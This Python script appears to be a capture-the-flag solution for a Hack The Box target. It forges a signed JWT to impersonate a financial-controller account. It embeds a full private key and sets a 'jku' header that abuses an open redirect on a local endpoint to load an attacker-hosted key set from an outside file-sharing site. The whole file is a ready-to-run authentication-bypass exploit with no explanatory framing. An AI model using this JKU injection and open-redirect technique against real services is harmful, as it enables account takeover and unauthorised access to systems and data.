import jwt
import datetime

private_key = """-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQCl+hDcRSZR73cG
HpsYICa5No1Xwo/SoA6FlyUnyjxAchR9TSTRsCD6el3choL+8V/czaCow+J1SgL2
TRml0WvVozmO+Sjkf+0PkymgOcXo+T0Re+q1AS5yBM39VS+OlhMNr0uWOp9AnAAk
2p67fWkE4F+n0NicCIPtqb6uJPecmJsxNUlHvFeM/TqaS9XJlpUrSmY406WecsnK
CFQjzCaKfGM/lY568t6f/q74s2ujieEpIpC4dIEAC9VqZgW37ScF4K3SAl0VIRb9
9Ym8IHrKzz8lzok/SCtNyEtP6u/tjy8hQxqDqCakM2PmnJdvZ67AJ1oH85/on6I3
dx+u3mgrAgMBAAECggEAIgKEs+4DdSShegKJez8TUD5qZgI7IEil0R/wgB/Dit0V
b7uAAOubRlgOpaJ2czEYmJEWC57f53K7+qY/zCeGdidVIwPRKklAVUGtdOSBtkRk
DBIdPOu6DakIYJG1Bf2gd9xkm6r1ePK+YM7fWcHP5CzpzORRjl98URXIObzfdBnI
HCQYqj6OUZhnTgvV8Dl7OGrKDM7euIN6ywRwqvIB6R82MHoJXXjfNpOo/GAB6B+S
Un91tr4lqV72uYWPFnlnV0Uki3d8uo2r88QuEN1JwIICsY0w4B1xO/IYrFgX6/GI
1Ac4w0zpYgo5EU5F9YI/PM+HOPI5uYtSeVOTjnjRiQKBgQDnyOEWA1gFCFA/BcXa
ukaBx/S97PH8DUyqhB4aKHut/QTcxdFlEHh0S1GRqmGAC07FWfLr60oVb65scyxv
zrt6f3QlL8KxwZE4qtbkd4NBPkD/CLNeGGqnFjSEYoAcnfZeQjNK6mpt8/b++uSF
jlZBoLdTKM8tr+5FYs26yv/8BwKBgQC3USTjmG/6cXv9/hyjPAIPgEW7D/LAgwTt
YAvSZ2PSpJaXqFVZrJ9/01WuCIK3fgxH5rba6wV3yupJEE6GQmaKLexbLOn58T7N
T9t9Mj/hKCKYuld+2kNiOFB9vD0Wc21WSLpuRVmd8ZK130iGoGH0QskIStdNuENU
UO8SiTwxvQKBgAR88kbP18N5LryZqwQaOUVIDugij2j3BPYESuTsxcBPtuljdzOC
xyJRVwoAB5VIIsVVgYup6axSlkkJTeH4Wc78as5Rh26TtfEn9bNE0SjRQMbvbzGy
PVZw6qFpmtty/5NBquaXdWodoDm9t/ESGX950jLtBl33GyEC0cL9LUm/AoGAGIc5
+V4PNaJzpcOXj1vbJrnSGrqCj7G4Og7M5iVBXRD6uWYjrXEEknTzlOq8mtK5z/EV
7Grf+2xiNs6Aw0QlNj34zyZOVEwsTApwYusTUwwsvOTKCkYoF/9S/c/vGI7vRUlL
8K9E03ZcXAt5R9Iz6Rv6jCp/bn3GPITryD4mmL0CgYEAsAaZcrip2YBVzErmiXX5
iGieMtpi9Nd1nZSFzpsWHW9xGjGtQ/yS8caGEuHgLs20UJKs6aHt987Pj+033wBV
WFLrWaqMrtxSeTdSD0S1ZyxbqeJc6FEtyFhxuSwsa3G9daHEXsJtLlhiPif6Xs1s
OEAOmSxd3J5vWLjsidfhJtY=
-----END PRIVATE KEY-----
"""

headers = {
    "alg": "RS256",
    "typ": "JWT",
    "kid": "d8e12b30-a4ab-442a-bb16-425e06220576",
    "jku": "http://127.0.0.1:1337/api/analytics/redirect?url=https://temp.staticsave.com/675c4d3d55fac.json&ref=0"
}

payload = {
    "email": "financial-controller@frontier-board.htb",
    "iat": datetime.datetime.now().timestamp()
}

# Generate token
token = jwt.encode(payload, private_key, algorithm="RS256", headers=headers)

print(f"JWT Token: {token}")
